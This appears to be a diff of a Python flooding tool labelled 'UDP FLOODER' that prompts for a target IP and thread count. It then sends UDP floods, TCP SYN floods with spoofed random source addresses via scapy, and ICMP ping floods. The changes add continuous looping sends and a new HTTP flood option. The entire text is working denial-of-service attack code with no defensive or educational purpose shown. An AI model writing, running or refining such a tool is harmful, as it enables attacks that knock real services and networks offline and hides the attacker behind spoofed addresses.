@@ -2,14 +2,13 @@ import threading
 import random
 from scapy.all import *
 import ping3
-
 print("""
   _    _  _____   _____         ______  _       ____    ____   _____   ______  _____  
  | |  | ||  __ \ |  __ \       |  ____|| |     / __ \  / __ \ |  __ \ |  ____||  __ \ 
  | |  | || |  | || |__) |      | |__   | |    | |  | || |  | || |  | || |__   | |__) |
  | |  | || |  | ||  ___/       |  __|  | |    | |  | || |  | || |  | ||  __|  |  _  / 
  | |__| || |__| || |           | |     | |____| |__| || |__| || |__| || |____ | | \ \ 
-  \____/ |_____/ |_|           |_|     |______|\____/  \____/ |_____/ |______||_|  \_\
+  \____/ |_____/ |_|           |_|     |______|\____/  \____/ |_____/ |______||_|  \_/
                                                                                        
 """)
 
@@ -94,10 +93,10 @@ method = int(input("""What method?
 
 
 targ = str(input("What is the IP? "))
+Port = random.randrange(1,200)
 x = int(input("How many requests to send? "))
-packet_size = 65000
+packet_size = 1024
 threads = int(input("How many threads? "))
-
 
 
 
@@ -119,12 +118,11 @@ def udp_method():
 
     while not done:
         for _ in range(x):
-            Port = random.randrange(1,200)
             if done:
                 break
                 
-            ip = IP(src=randomIP(), dst=targ) # type: ignore
-            udp = UDP(dport=Port)  # type: ignore
+            ip = IP(src=randomIP(), dst=targ)
+            udp = UDP(dport=Port) 
             raw = Raw(load=payload)
             pkt = ip / udp / raw
 
@@ -133,46 +131,40 @@ def udp_method():
             c += 1
             print("Sent ! Packet number: ", c, "UDP method")
         done = True
+
 def tcp_method():
-    
     global done
     c = 0
     payload_size = packet_size - 20 - 20  # Adjust for the IP header (20 bytes) and TCP header (20 bytes)
     payload = "A" * payload_size  # Create the payload
-    Port = int(input("What port would you like to attack"))
 
     while not done:
         for _ in range(x):
             if done:
                 break
                 
-            ip = IP(src=randomIP(), dst=targ)
-            tcp = TCP(sport=random.randint(1,65000), dport=Port, flags="S") 
+            ip = IP(src=randomIP(), dst=targ) # type: ignore
+            tcp = TCP(sport=RandShort(), dport=Port, flags="S") 
             raw = Raw(load=payload)
             pkt = ip / tcp / raw
-            
 
                 
-            send(pkt, verbose = 0)
+            send(pkt, loop=1, verbose=0)
             c += 1
-            print("Send SYN packet number: ", c)
+            print("Sent ! Packet number: ", c, "TCP method")
         done = True
-            
+
 def icmp_method():
     global done
-    while not done:
-        for _ in range(x):
-            if done:
-                break
-            if not done:
-                d = ping3.verbose_ping(targ , size=1470 , timeout=ask_speed , interval=delay)
-                print(d)
-        done = True
+    for _ in range(x):
+        if done:
+            break
+        ping3.verbose_ping(targ , size=B , timeout=wait, ttl=250)
+    done = True
 
-            
+
     
-
-
+        
     
 
 
@@ -186,11 +178,16 @@ if method == 2:
         t = threading.Thread(target=tcp_method, daemon=True)
         t.start()
 if method == 3:
-    ask_speed = float(input("how often to check for output"))
-    delay = float(input(f"How often to send {threads} amount of packets "))
-    for _ in range(threads): # Start x amount of threads
+    wait = float(input("how long should we wait for a response for?"))
+    B = int(input("Size of packet? 1-65500"))
+    for _ in range(threads):
         t = threading.Thread(target=icmp_method, daemon=True)
         t.start()
+if method == 4:
+    for _ in range(threads):
+        t = threading.Thread(target=http_method, daemon=True)
+        t.start()
+
 
 
 
